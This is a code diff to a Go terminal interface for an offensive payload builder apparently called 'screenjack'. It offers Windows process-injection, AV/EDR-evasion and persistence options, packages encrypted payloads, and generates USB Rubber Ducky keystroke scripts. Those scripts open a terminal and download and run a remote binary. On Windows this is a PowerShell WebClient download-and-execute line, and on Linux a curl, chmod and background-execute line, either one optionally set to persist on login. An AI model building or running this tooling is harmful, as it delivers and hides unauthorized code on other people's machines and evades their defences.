@@ -10,13 +10,15 @@ import (
 	"strings"
 	"time"
 
-	"github.com/charmbracelet/bubbles/filepicker"
-	"github.com/charmbracelet/bubbles/help"
-	"github.com/charmbracelet/bubbles/key"
-	"github.com/charmbracelet/bubbles/list"
-	"github.com/charmbracelet/bubbles/textinput"
-	tea "github.com/charmbracelet/bubbletea"
-	"github.com/charmbracelet/lipgloss"
+	"charm.land/bubbles/v2/filepicker"
+	"charm.land/bubbles/v2/help"
+	"charm.land/bubbles/v2/key"
+	"charm.land/bubbles/v2/list"
+	"charm.land/bubbles/v2/spinner"
+	"charm.land/bubbles/v2/textinput"
+	"charm.land/bubbles/v2/viewport"
+	tea "charm.land/bubbletea/v2"
+	"charm.land/lipgloss/v2"
 )
 
 // Tab represents a main navigation tab
@@ -52,13 +54,13 @@ type PackageConfig struct {
 
 var execMethods = []string{
 	"Raw Binary",
-	"Process Ghosting [Win]",
-	"Process Hollowing [Win]",
-	"Process Herpaderping [Win]",
-	"APC Injection [Win]",
-	"Thread Hijacking [Win]",
-	"Threadless Injection [Win]",
-	"Module Stomping [Win]",
+	"Ghost [Win]",
+	"Hollow [Win]",
+	"Herpaderp [Win]",
+	"APC Inject [Win]",
+	"Thread Hijack [Win]",
+	"Threadless [Win]",
+	"Module Stomp [Win]",
 }
 
 var evasionMethods = []string{
@@ -66,13 +68,13 @@ var evasionMethods = []string{
 	"ETW Patch [Win]",
 	"NTDLL Unhook [Win]",
 	"PPID Spoof [Win]",
-	"Block DLL Policy [Win]",
+	"Block DLLs [Win]",
 	"Anti-Debug [Win]",
 	"Anti-Analysis [Win]",
 	"Direct Syscalls [Win]",
 }
 
-var persistMethods = []string{"None", "Registry Run [Win]", "XDG Autostart [Lin]", "Self-Delete [Win]"}
+var persistMethods = []string{"None", "Registry [Win]", "XDG [Lin]", "Self-Del [Win]"}
 
 // KeyMap defines all keybindings
 type KeyMap struct {
@@ -96,6 +98,8 @@ type KeyMap struct {
 	Back     key.Binding
 	Build    key.Binding
 	Cancel   key.Binding
+	Test     key.Binding
+	Preview  key.Binding
 }
 
 func DefaultKeyMap() KeyMap {
@@ -112,7 +116,7 @@ func DefaultKeyMap() KeyMap {
 		Down:     key.NewBinding(key.WithKeys("j", "down"), key.WithHelp("j/down", "down")),
 		Left:     key.NewBinding(key.WithKeys("left"), key.WithHelp("left", "left")),
 		Right:    key.NewBinding(key.WithKeys("right"), key.WithHelp("right", "right")),
-		Toggle:   key.NewBinding(key.WithKeys(" "), key.WithHelp("space", "toggle")),
+		Toggle:   key.NewBinding(key.WithKeys(" ", "space"), key.WithHelp("space", "toggle")),
 		Confirm:  key.NewBinding(key.WithKeys("enter"), key.WithHelp("enter", "confirm")),
 		Server:   key.NewBinding(key.WithKeys("s"), key.WithHelp("s", "server")),
 		Assets:   key.NewBinding(key.WithKeys("a"), key.WithHelp("a", "assets")),
@@ -120,11 +124,13 @@ func DefaultKeyMap() KeyMap {
 		Back:     key.NewBinding(key.WithKeys("esc"), key.WithHelp("esc", "back")),
 		Build:    key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
 		Cancel:   key.NewBinding(key.WithKeys("c"), key.WithHelp("c", "cancel")),
+		Test:     key.NewBinding(key.WithKeys("t"), key.WithHelp("t", "test")),
+		Preview:  key.NewBinding(key.WithKeys("p"), key.WithHelp("p", "preview")),
 	}
 }
 
 func (k KeyMap) ShortHelp() []key.Binding {
-	return []key.Binding{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Build, k.Cancel, k.Server, k.Quit}
+	return []key.Binding{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Build, k.Test, k.Server, k.Quit}
 }
 
 func (k KeyMap) FullHelp() [][]key.Binding {
@@ -132,7 +138,7 @@ func (k KeyMap) FullHelp() [][]key.Binding {
 		{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Tab},
 		{k.Up, k.Down, k.Left, k.Right},
 		{k.Toggle, k.Confirm, k.Build, k.Cancel},
-		{k.Server, k.Assets, k.Logs, k.Quit},
+		{k.Server, k.Assets, k.Test, k.Preview, k.Logs, k.Quit},
 	}
 }
 
@@ -144,8 +150,9 @@ const (
 	ModalAssets
 	ModalFilePicker
 	ModalLogs
-	ModalBuildLogs // build output logs with copy support
-	ModalPreview
+	ModalBuildLogs    // build output logs with copy support
+	ModalPreview      // asset preview
+	ModalDuckyPreview // ducky script preview
 	ModalPackage
 	ModalInput // generic text input modal
 )
@@ -339,9 +346,10 @@ type TUIModel struct {
 	modal Modal
 
 	// Build tab
-	targetList list.Model
-	buildFocus int // 0=list, 1=build button
-	buildMsg   string
+	targetList  list.Model
+	buildFocus  int // 0=list, 1=embed toggle, 2=docker toggle, 3=build button
+	buildMsg    string
+	dockerBuild bool // true = build via Docker, false = native cargo
 
 	// Build system
 	buildState      BuildState
@@ -355,6 +363,8 @@ type TUIModel struct {
 	buildProgressCh chan TargetProgress
 	buildLogCh      chan string
 	buildDoneCh     <-chan buildCompleteMsg
+	buildSpinner    spinner.Model
+	logViewport     viewport.Model
 
 	// Assets
 	assetList     list.Model
@@ -362,12 +372,14 @@ type TUIModel struct {
 	filePicker    filepicker.Model
 	pathInput     textinput.Model // for typing paths directly
 	pathInputMode bool            // true when typing path, false when browsing
+	assetPreview  *PreviewModel   // ASCII preview of selected asset
 
 	// Ducky tab
 	duckyOS      string
 	urlInput     textinput.Model
 	payloadInput textinput.Model
-	duckyFocus   int // 0=OS, 1=URL, 2=payload
+	duckyPersist bool // include --persist flag
+	duckyFocus   int  // 0=OS, 1=URL, 2=payload, 3=persist, 4=generate
 	duckyMsg     string
 	duckyLastGen string // timestamp of last generation
 
@@ -388,6 +400,9 @@ type TUIModel struct {
 
 	// Status
 	status string
+
+	// Config
+	config Config
 }
 
 const logo = `  ____                            _            _
@@ -398,12 +413,18 @@ const logo = `  ____                            _            _
                                |__/                 `
 
 func NewTUIModel() TUIModel {
-	// Target list
+	// Load config
+	cfg := LoadConfig()
+
+	// Target list - native and docker targets
 	targets := []list.Item{
-		TargetItem{Name: "linux-x86_64", Target: "x86_64-unknown-linux-gnu", Selected: false},
-		TargetItem{Name: "windows-x86_64", Target: "x86_64-pc-windows-gnu", Selected: false},
+		TargetItem{Name: "linux-gnu", Target: "x86_64-unknown-linux-gnu", Selected: false},
+		TargetItem{Name: "linux-musl", Target: "x86_64-unknown-linux-musl", Selected: false},
+		TargetItem{Name: "linux-alpine", Target: "docker-alpine", Selected: false},
+		TargetItem{Name: "linux-debian", Target: "docker-debian", Selected: false},
+		TargetItem{Name: "windows", Target: "x86_64-pc-windows-gnu", Selected: false},
 	}
-	targetList := list.New(targets, TargetDelegate{}, 40, 6)
+	targetList := list.New(targets, TargetDelegate{}, 40, 8)
 	targetList.SetShowTitle(false)
 	targetList.SetShowStatusBar(false)
 	targetList.SetShowHelp(false)
@@ -422,25 +443,26 @@ func NewTUIModel() TUIModel {
 	fp.AllowedTypes = []string{".gif", ".png", ".jpg", ".jpeg"}
 	fp.CurrentDirectory, _ = os.UserHomeDir()
 	fp.ShowHidden = false
-	fp.Height = 15
+	fp.SetHeight(15)
 
-	// Text inputs for Ducky tab
+	// Text inputs for Ducky tab - use config defaults
+	defaultURL := fmt.Sprintf("http://localhost:%d", cfg.ServerPort)
 	urlInput := textinput.New()
-	urlInput.Placeholder = "http://localhost:8000"
-	urlInput.SetValue("http://localhost:8000")
-	urlInput.Width = 30
+	urlInput.Placeholder = defaultURL
+	urlInput.SetValue(defaultURL)
+	urlInput.SetWidth(30)
 	urlInput.Prompt = ""
 
 	payloadInput := textinput.New()
-	payloadInput.Placeholder = "screenjack"
-	payloadInput.SetValue("screenjack")
-	payloadInput.Width = 20
+	payloadInput.Placeholder = cfg.PayloadName
+	payloadInput.SetValue(cfg.PayloadName)
+	payloadInput.SetWidth(20)
 	payloadInput.Prompt = ""
 
 	// Path input for adding assets
 	pathInput := textinput.New()
 	pathInput.Placeholder = "~/path/to/file.gif"
-	pathInput.Width = 50
+	pathInput.SetWidth(50)
 	pathInput.Prompt = "> "
 
 	// Help
@@ -449,8 +471,16 @@ func NewTUIModel() TUIModel {
 
 	// Input modal
 	inputModal := textinput.New()
-	inputModal.Width = 40
+	inputModal.SetWidth(40)
 	inputModal.Prompt = "> "
+
+	// Log viewport for scrollable build logs
+	logVP := viewport.New(viewport.WithWidth(70), viewport.WithHeight(15))
+	logVP.Style = lipgloss.NewStyle().Foreground(colorStone50)
+
+	// Build spinner
+	sp := spinner.New(spinner.WithSpinner(spinner.Dot))
+	sp.Style = lipgloss.NewStyle().Foreground(colorAmber)
 
 	return TUIModel{
 		activeTab:     TabBuild,
@@ -460,7 +490,7 @@ func NewTUIModel() TUIModel {
 		assetList:     assetList,
 		filePicker:    fp,
 		pathInput:     pathInput,
-		duckyOS:       "linux",
+		duckyOS:       cfg.DefaultOS,
 		urlInput:      urlInput,
 		payloadInput:  payloadInput,
 		server:        NewServer(),
@@ -471,7 +501,11 @@ func NewTUIModel() TUIModel {
 		buildState:    BuildIdle,
 		buildProgress: []TargetProgress{},
 		buildLogs:     []string{},
-		embedAsset:    true,
+		embedAsset:    cfg.EmbedAsset,
+		buildSpinner:  sp,
+		logViewport:   logVP,
+		config:        cfg,
+		selectedAsset: cfg.LastAsset,
 	}
 }
 
@@ -509,30 +543,13 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	switch msg := msg.(type) {
 	case tea.WindowSizeMsg:
 		m.width, m.height = msg.Width, msg.Height
-		m.help.Width = msg.Width
+		m.help.SetWidth(msg.Width)
 		m.targetList.SetSize(mainBoxW-4, 6)
 		m.assetList.SetSize(mainBoxW-4, 12)
-		m.filePicker.Height = 15
+		m.filePicker.SetHeight(15)
 		return m, nil
 
-	case tea.MouseMsg:
-		// Handle tab clicks - tabs are at the top after the logo
-		if msg.Action == tea.MouseActionPress && msg.Button == tea.MouseButtonLeft {
-			// Tab bar is roughly at y=7-8, tabs start around x=30
-			// Each tab is ~10 chars wide with padding
-			if msg.Y >= 6 && msg.Y <= 8 {
-				tabWidth := 10
-				tabStart := (m.width - 4*tabWidth) / 2 // centered tabs
-				if msg.X >= tabStart {
-					tabIdx := (msg.X - tabStart) / tabWidth
-					if tabIdx >= 0 && tabIdx < 4 {
-						m.activeTab = Tab(tabIdx)
-						return m, nil
-					}
-				}
-			}
-		}
-		return m, nil
+	// ponytail: mouse support disabled for now, re-enable with bubblezone later
 
 	case assetsScannedMsg:
 		items := make([]list.Item, len(msg.assets))
@@ -555,15 +572,11 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		m.modal = ModalNone
 		return m, scanAssetsCmd()
 
-	case buildDoneMsg:
-		// ponytail: legacy handler, will be replaced by new build system
-		m.buildLogs = strings.Split(msg.log, "\n")
-		if msg.ok {
-			m.buildMsg = styleSuccess.Render("[OK] " + msg.msg)
-			m.status = styleSuccess.Render("Build complete")
-		} else {
-			m.buildMsg = styleError.Render("[X] " + msg.msg)
-			m.status = styleError.Render("Build failed")
+	case spinner.TickMsg:
+		if m.buildState == BuildRunning {
+			var cmd tea.Cmd
+			m.buildSpinner, cmd = m.buildSpinner.Update(msg)
+			return m, cmd
 		}
 		return m, nil
 
@@ -593,10 +606,16 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		result := msg.toResult()
 		m.buildState = BuildIdle
 		m.buildCancel = nil
+		// Get payload sizes
+		sizes := getPayloadSizes()
+		sizeInfo := ""
+		if sizes != "" {
+			sizeInfo = " " + sizes
+		}
 		if result.Success {
-			m.status = styleSuccess.Render("[OK] " + result.Summary)
+			m.status = styleSuccess.Render("[OK] " + result.Summary + sizeInfo)
 		} else if result.Partial {
-			m.status = styleWarn.Render("[!] " + result.Summary)
+			m.status = styleWarn.Render("[!] " + result.Summary + sizeInfo)
 		} else if result.Cancelled {
 			m.status = styleStatus.Render("Build cancelled")
 		} else {
@@ -623,6 +642,10 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		}
 		return m, nil
 
+	case testDoneMsg:
+		m.status = styleSuccess.Render("Test complete")
+		return m, nil
+
 	case tea.KeyMsg:
 		// Modal handling
 		if m.modal != ModalNone {
@@ -633,6 +656,11 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		switch {
 		case key.Matches(msg, m.keys.Quit):
 			m.server.Stop()
+			// Save config with current values
+			m.config.EmbedAsset = m.embedAsset
+			m.config.LastAsset = m.selectedAsset
+			m.config.DefaultOS = m.duckyOS
+			_ = SaveConfig(m.config)
 			return m, tea.Quit
 
 		case key.Matches(msg, m.keys.Help):
@@ -670,6 +698,8 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		case key.Matches(msg, m.keys.Logs):
 			// Context-sensitive: build logs modal on Build tab, server logs otherwise
 			if (m.activeTab == TabBuild || m.buildState == BuildRunning) && len(m.buildLogs) > 0 {
+				m.logViewport.SetContent(strings.Join(m.buildLogs, "\n"))
+				m.logViewport.GotoBottom()
 				m.modal = ModalBuildLogs
 			} else if m.server.IsRunning() {
 				m.modal = ModalLogs
@@ -681,6 +711,20 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 		case key.Matches(msg, m.keys.Cancel):
 			return m.handleCancelKey()
+
+		case key.Matches(msg, m.keys.Test):
+			return m.handleTestKey()
+
+		case key.Matches(msg, m.keys.Preview):
+			// Preview in Ducky tab shows script, elsewhere shows asset
+			if m.activeTab == TabDucky {
+				m.modal = ModalDuckyPreview
+			} else if m.selectedAsset != "" {
+				preview := NewPreview(m.selectedAsset, 60, 20)
+				m.assetPreview = &preview
+				m.modal = ModalPreview
+			}
+			return m, nil
 		}
 
 		// Tab-specific updates
@@ -710,6 +754,29 @@ func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			// Open file picker
 			m.modal = ModalFilePicker
 			return m, m.filePicker.Init()
+		case msg.String() == "p":
+			// Preview hovered asset
+			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
+				preview := NewPreview(item.Name, 60, 20)
+				m.assetPreview = &preview
+				m.modal = ModalPreview
+			}
+			return m, nil
+		case msg.String() == "d", msg.String() == "x":
+			// Delete hovered asset
+			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
+				path := "../assets/" + item.Name
+				if err := os.Remove(path); err != nil {
+					m.status = styleError.Render("Delete failed: " + err.Error())
+				} else {
+					m.status = styleSuccess.Render("Deleted " + item.Name)
+					if m.selectedAsset == item.Name {
+						m.selectedAsset = ""
+					}
+				}
+				return m, scanAssetsCmd()
+			}
+			return m, nil
 		case key.Matches(msg, m.keys.Confirm):
 			// Select current asset
 			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
@@ -792,6 +859,7 @@ func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		switch msg.String() {
 		case "esc", "l":
 			m.modal = ModalNone
+			return m, nil
 		case "c":
 			// Copy logs to clipboard
 			logText := strings.Join(m.buildLogs, "\n")
@@ -800,8 +868,13 @@ func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			} else {
 				m.status = styleSuccess.Render("Logs copied to clipboard")
 			}
+			return m, nil
+		default:
+			// Pass to viewport for scrolling (j/k, up/down, pgup/pgdn)
+			var cmd tea.Cmd
+			m.logViewport, cmd = m.logViewport.Update(msg)
+			return m, cmd
 		}
-		return m, nil
 
 	case ModalInput:
 		switch msg.String() {
@@ -821,13 +894,34 @@ func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			m.inputModal, cmd = m.inputModal.Update(msg)
 			return m, cmd
 		}
+
+	case ModalPreview:
+		if key.Matches(msg, m.keys.Back) || msg.String() == "p" {
+			m.modal = ModalNone
+			m.assetPreview = nil
+		}
+		return m, nil
+
+	case ModalDuckyPreview:
+		switch msg.String() {
+		case "esc", "p":
+			m.modal = ModalNone
+		case "c":
+			// Copy script to clipboard
+			if err := copyToClipboard(m.genDuckyScript()); err != nil {
+				m.status = styleError.Render("Copy failed: " + err.Error())
+			} else {
+				m.status = styleSuccess.Render("Script copied to clipboard")
+			}
+		}
+		return m, nil
 	}
 
 	return m, nil
 }
 
 func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
-	// buildFocus: 0=target list, 1=build button
+	// buildFocus: 0=target list, 1=embed toggle, 2=docker toggle, 3=build button
 	switch {
 	case key.Matches(msg, m.keys.Down):
 		if m.buildFocus == 0 {
@@ -836,40 +930,39 @@ func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				m.buildFocus = 1
 				return m, nil
 			}
-		}
-		if m.buildFocus == 0 {
 			var cmd tea.Cmd
 			m.targetList, cmd = m.targetList.Update(msg)
 			return m, cmd
+		} else if m.buildFocus < 3 {
+			m.buildFocus++
 		}
+		return m, nil
 	case key.Matches(msg, m.keys.Up):
-		if m.buildFocus == 1 {
+		if m.buildFocus > 1 {
+			m.buildFocus--
+			return m, nil
+		} else if m.buildFocus == 1 {
 			m.buildFocus = 0
 			return m, nil
 		}
 		var cmd tea.Cmd
 		m.targetList, cmd = m.targetList.Update(msg)
 		return m, cmd
-	case key.Matches(msg, m.keys.Toggle):
-		if m.buildFocus == 0 {
+	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
+		switch m.buildFocus {
+		case 0: // Toggle target selection
 			if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
 				item.Selected = !item.Selected
 				items := m.targetList.Items()
 				items[m.targetList.Index()] = item
 				m.targetList.SetItems(items)
 			}
-		}
-		return m, nil
-	case key.Matches(msg, m.keys.Confirm):
-		if m.buildFocus == 1 {
-			return m, m.buildTargets()
-		}
-		// On list, toggle selection
-		if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
-			item.Selected = !item.Selected
-			items := m.targetList.Items()
-			items[m.targetList.Index()] = item
-			m.targetList.SetItems(items)
+		case 1: // Toggle embed mode
+			m.embedAsset = !m.embedAsset
+		case 2: // Toggle docker mode
+			m.dockerBuild = !m.dockerBuild
+		case 3: // Build button
+			return m.handleBuildKey()
 		}
 		return m, nil
 	}
@@ -894,12 +987,12 @@ func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		return m, cmd
 	}
 
-	// duckyFocus: 0=OS, 1=URL, 2=payload, 3=generate button
+	// duckyFocus: 0=OS, 1=URL, 2=payload, 3=persist, 4=generate
 	switch {
 	case key.Matches(msg, m.keys.Up):
 		m.duckyFocus = max(0, m.duckyFocus-1)
 	case key.Matches(msg, m.keys.Down):
-		m.duckyFocus = min(3, m.duckyFocus+1)
+		m.duckyFocus = min(4, m.duckyFocus+1)
 	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
 		switch m.duckyFocus {
 		case 0: // Toggle OS
@@ -914,7 +1007,9 @@ func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		case 2: // Focus payload input
 			m.payloadInput.Focus()
 			return m, textinput.Blink
-		case 3: // Generate button
+		case 3: // Toggle persist
+			m.duckyPersist = !m.duckyPersist
+		case 4: // Generate button
 			m.genDucky()
 			m.status = styleSuccess.Render("Ducky script saved")
 		}
@@ -1020,8 +1115,12 @@ func (m *TUIModel) buildPackage() tea.Cmd {
 			anyEvasion || // All evasion methods are Windows
 			m.pkgConfig.PersistMethod == 1 || m.pkgConfig.PersistMethod == 3 // Registry or Self-delete
 
+		// Paths relative to orchestra (for os.Stat)
 		winPayload := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
 		linPayload := "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"
+		// Paths relative to screenjack root (for just commands, which run with Dir="..")
+		winPayloadJust := "payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
+		linPayloadJust := "payload/target/x86_64-unknown-linux-gnu/release/screenjack"
 
 		if needsWindows {
 			if _, err := os.Stat(winPayload); os.IsNotExist(err) {
@@ -1034,32 +1133,32 @@ func (m *TUIModel) buildPackage() tea.Cmd {
 
 		// Encryption (works on any payload)
 		if m.pkgConfig.Encrypt {
-			payload := winPayload
+			payloadJust := winPayloadJust
 			if !needsWindows {
 				if _, err := os.Stat(linPayload); err == nil {
-					payload = linPayload
+					payloadJust = linPayloadJust
 				} else if _, err := os.Stat(winPayload); err == nil {
-					payload = winPayload
+					payloadJust = winPayloadJust
 				} else {
 					return packageDoneMsg{false, "Build a payload first (tab 1)"}
 				}
 			}
-			cmds = append(cmds, fmt.Sprintf("just -f package.just encrypt %s", payload))
+			cmds = append(cmds, fmt.Sprintf("just -f package.just encrypt %s", payloadJust))
 			info = append(info, "encrypted")
 		}
 
 		// Execution method (Windows only, indices match execMethods array)
 		switch m.pkgConfig.ExecMethod {
 		case 1: // Process Ghosting
-			cmds = append(cmds, fmt.Sprintf("just -f package.just ghost %s", winPayload))
+			cmds = append(cmds, fmt.Sprintf("just -f package.just ghost %s", winPayloadJust))
 			info = append(info, "ghost")
 		case 2: // Process Hollowing
-			cmds = append(cmds, fmt.Sprintf("just -f package.just hollow %s %s", winPayload, m.pkgConfig.HollowTarget))
+			cmds = append(cmds, fmt.Sprintf("just -f package.just hollow %s %s", winPayloadJust, m.pkgConfig.HollowTarget))
 			info = append(info, "hollow")
 		case 3: // Process Herpaderping
 			info = append(info, "herpaderp (TODO)")
 		case 4: // APC Injection
-			cmds = append(cmds, fmt.Sprintf("just -f package.just inject %s", winPayload))
+			cmds = append(cmds, fmt.Sprintf("just -f package.just inject %s", winPayloadJust))
 			info = append(info, "apc")
 		case 5: // Thread Hijacking
 			info = append(info, "thread-hijack (TODO)")
@@ -1071,7 +1170,7 @@ func (m *TUIModel) buildPackage() tea.Cmd {
 
 		// Self-delete (Windows)
 		if m.pkgConfig.PersistMethod == 3 {
-			cmds = append(cmds, fmt.Sprintf("just -f package.just selfdel %s", winPayload))
+			cmds = append(cmds, fmt.Sprintf("just -f package.just selfdel %s", winPayloadJust))
 			info = append(info, "selfdel")
 		}
 
@@ -1103,49 +1202,6 @@ func (m *TUIModel) buildPackage() tea.Cmd {
 	}
 }
 
-type buildDoneMsg struct {
-	ok  bool
-	msg string
-	log string
-}
-
-func (m *TUIModel) buildTargets() tea.Cmd {
-	return func() tea.Msg {
-		var logs strings.Builder
-		var out []string
-		ok := true
-
-		items := m.targetList.Items()
-		for _, it := range items {
-			t, isTarget := it.(TargetItem)
-			if !isTarget || !t.Selected {
-				continue
-			}
-
-			logs.WriteString(fmt.Sprintf("=== %s ===\n", t.Target))
-			cmd := exec.Command("cargo", "build", "--release", "--target", t.Target)
-			cmd.Dir = "../payload"
-			output, err := cmd.CombinedOutput()
-			logs.Write(output)
-			logs.WriteString("\n")
-
-			if err != nil {
-				ok = false
-				out = append(out, t.Name+":FAIL")
-			} else {
-				out = append(out, t.Name+":OK")
-			}
-		}
-
-		if len(out) == 0 {
-			return buildDoneMsg{false, "nothing selected", ""}
-		}
-
-		os.WriteFile("/tmp/screenjack-build.log", []byte(logs.String()), 0644)
-		return buildDoneMsg{ok, strings.Join(out, " "), logs.String()}
-	}
-}
-
 func (m *TUIModel) toggleServer() tea.Cmd {
 	if m.server.IsRunning() {
 		m.server.Stop()
@@ -1169,7 +1225,8 @@ func (m *TUIModel) toggleServer() tea.Cmd {
 	return nil
 }
 
-func (m *TUIModel) genDucky() {
+// genDuckyScript returns the ducky script content without writing to file
+func (m *TUIModel) genDuckyScript() string {
 	var b strings.Builder
 
 	baseURL := m.urlInput.Value()
@@ -1179,8 +1236,16 @@ func (m *TUIModel) genDucky() {
 	}
 	url := strings.TrimSuffix(baseURL, "/") + "/" + payloadName
 
+	persistFlag := ""
+	if m.duckyPersist {
+		persistFlag = " --persist"
+	}
+
 	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
 	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
+	if m.duckyPersist {
+		b.WriteString("REM persist: enabled (will run on login)\n")
+	}
 	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
 	b.WriteString("DELAY 500\n\n")
 
@@ -1192,24 +1257,47 @@ func (m *TUIModel) genDucky() {
 		b.WriteString("ENTER\n")
 		b.WriteString("DELAY 500\n\n")
 		b.WriteString("REM Download and execute\n")
-		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
-			url, payloadName))
+		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -ArgumentList '%s'\n",
+			url, payloadName, persistFlag))
 		b.WriteString("ENTER\n")
 	} else {
 		b.WriteString("REM Open terminal\n")
 		b.WriteString("CTRL-ALT t\n")
 		b.WriteString("DELAY 500\n\n")
 		b.WriteString("REM Download, chmod, execute in background\n")
-		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, payloadName, payloadName))
+		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s%s &\n", url, payloadName, payloadName, persistFlag))
 		b.WriteString("ENTER\n")
 		b.WriteString("DELAY 300\n")
 		b.WriteString("STRING exit\n")
 		b.WriteString("ENTER\n")
 	}
 
+	return b.String()
+}
+
+func (m *TUIModel) genDucky() {
+	script := m.genDuckyScript()
 	os.MkdirAll("../ducky", 0755)
-	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(b.String()), 0644)
+	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(script), 0644)
 	m.duckyLastGen = time.Now().Format("15:04:05")
+}
+
+// genDuckyPreview returns the ducky script with syntax highlighting
+func (m *TUIModel) genDuckyPreview() string {
+	script := m.genDuckyScript()
+	var lines []string
+	for _, line := range strings.Split(script, "\n") {
+		if strings.HasPrefix(line, "REM") {
+			lines = append(lines, styleStatus.Render(line))
+		} else if strings.HasPrefix(line, "STRING") {
+			lines = append(lines, styleSuccess.Render(line))
+		} else if strings.HasPrefix(line, "DELAY") {
+			lines = append(lines, styleWarn.Render(line))
+		} else {
+			lines = append(lines, styleFocusedValue.Render(line))
+		}
+	}
+	return strings.Join(lines, "\n")
 }
 
 // handleBuildKey processes the "b" key for unified build
@@ -1231,11 +1319,12 @@ func (m TUIModel) handleBuildKey() (tea.Model, tea.Cmd) {
 
 	// Create job
 	job := &BuildJob{
-		Targets:    targets,
-		Asset:      "../assets/" + m.selectedAsset,
-		EmbedAsset: m.embedAsset,
-		PkgConfig:  m.pkgConfig,
-		StartedAt:  time.Now(),
+		Targets:     targets,
+		Asset:       "../assets/" + m.selectedAsset,
+		EmbedAsset:  m.embedAsset,
+		DockerBuild: m.dockerBuild,
+		PkgConfig:   m.pkgConfig,
+		StartedAt:   time.Now(),
 	}
 
 	// Handle platform mismatch warnings
@@ -1271,7 +1360,7 @@ func (m TUIModel) startBuild(job *BuildJob) (tea.Model, tea.Cmd) {
 
 	m.status = styleWarn.Render("Building...")
 
-	return m, m.listenForBuildUpdates()
+	return m, tea.Batch(m.listenForBuildUpdates(), m.buildSpinner.Tick)
 }
 
 // startBuildCmd wraps startBuild as tea.Cmd for queue handling
@@ -1322,6 +1411,87 @@ func (m TUIModel) handleCancelKey() (tea.Model, tea.Cmd) {
 	return m, nil
 }
 
+// handleTestKey runs the payload locally with the selected asset
+func (m TUIModel) handleTestKey() (tea.Model, tea.Cmd) {
+	// Find a built payload (prefer linux on linux)
+	payloadPath, ok := PayloadExists("linux")
+	if !ok {
+		payloadPath, ok = PayloadExists("windows")
+	}
+	if !ok {
+		m.status = styleError.Render("No payload built - press b first")
+		return m, nil
+	}
+
+	// Build args
+	var args []string
+	if m.selectedAsset != "" {
+		args = append(args, "../assets/"+m.selectedAsset)
+	}
+
+	m.status = styleWarn.Render("Testing payload... (Ctrl+Shift+Esc to exit)")
+
+	return m, func() tea.Msg {
+		cmd := exec.Command(payloadPath, args...)
+		cmd.Dir = "."
+		_ = cmd.Run() // blocks until payload exits
+		return testDoneMsg{}
+	}
+}
+
+type testDoneMsg struct{}
+
+// getPayloadSizes returns a string with payload sizes (e.g. "lin:1.2M win:2.3M")
+func getPayloadSizes() string {
+	var parts []string
+	linPath := "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"
+	winPath := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
+
+	if info, err := os.Stat(linPath); err == nil {
+		parts = append(parts, fmt.Sprintf("lin:%s", humanSize(info.Size())))
+	}
+	if info, err := os.Stat(winPath); err == nil {
+		parts = append(parts, fmt.Sprintf("win:%s", humanSize(info.Size())))
+	}
+	return strings.Join(parts, " ")
+}
+
+func humanSize(bytes int64) string {
+	const unit = 1024
+	if bytes < unit {
+		return fmt.Sprintf("%dB", bytes)
+	}
+	div, exp := int64(unit), 0
+	for n := bytes / unit; n >= unit && exp < 2; n /= unit {
+		div *= unit
+		exp++
+	}
+	return fmt.Sprintf("%.1f%c", float64(bytes)/float64(div), "KMG"[exp])
+}
+
+// shortTargetName maps full target names to display names
+func shortTargetName(target string) string {
+	switch target {
+	case "x86_64-unknown-linux-gnu":
+		return "linux-gnu"
+	case "x86_64-unknown-linux-musl":
+		return "linux-musl"
+	case "x86_64-pc-windows-gnu":
+		return "windows"
+	case "docker-alpine":
+		return "docker-alpine"
+	case "docker-debian":
+		return "docker-debian"
+	case "docker-arch":
+		return "docker-arch"
+	default:
+		if len(target) > 14 {
+			return target[:11] + "..."
